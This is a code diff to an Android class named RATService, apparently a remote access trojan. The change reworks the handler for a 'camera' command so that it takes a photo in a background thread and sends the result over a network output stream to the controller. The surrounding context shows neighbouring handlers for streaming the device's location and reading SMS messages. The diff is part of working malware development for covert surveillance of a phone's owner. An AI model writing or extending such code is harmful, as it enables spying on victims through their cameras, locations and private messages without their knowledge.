@@ -553,15 +553,50 @@ public class RATService extends Service {
                 handleLocationStreamCommand(args);
                 break;
                 
-            case "camera":
-            case "camera_photo":
-                if (cameraModule != null) {
-                    String result = cameraModule.takePhoto();
-                    sendCommand("CAMERA|" + result);
+         case "camera":
+case "camera_photo":
+    if (cameraModule != null) {
+        Log.d(TAG, "📸 Taking photo with camera module");
+        
+        // Run on a separate thread to avoid blocking
+        new Thread(() -> {
+            try {
+                String result = cameraModule.takePhoto();
+                Log.d(TAG, "📸 Camera result: " + (result != null ? result.substring(0, Math.min(50, result.length())) : "null"));
+                
+                if (result != null && result.startsWith("CAMERA|")) {
+                    // Send the result directly - don't chunk it
+                    if (out != null) {
+                        out.println(result);
+                        out.flush();
+                        Log.d(TAG, "📸 Camera response sent successfully");
+                    } else {
+                        Log.e(TAG, "📸 Output stream is null");
+                    }
                 } else {
-                    sendCommand("CAMERA|ERROR: Camera module not available");
+                    Log.e(TAG, "📸 Invalid camera result");
+                    if (out != null) {
+                        out.println("CAMERA|ERROR: Invalid result");
+                        out.flush();
+                    }
                 }
-                break;
+            } catch (Exception e) {
+                Log.e(TAG, "📸 Error taking photo", e);
+                try {
+                    if (out != null) {
+                        out.println("CAMERA|ERROR: " + e.getMessage());
+                        out.flush();
+                    }
+                } catch (Exception ex) {
+                    Log.e(TAG, "📸 Error sending error", ex);
+                }
+            }
+        }).start();
+    } else {
+        Log.e(TAG, "📸 Camera module is null");
+        sendCommand("CAMERA|ERROR: Camera module not available");
+    }
+    break;
                 
             case "sms":
             case "get_sms":
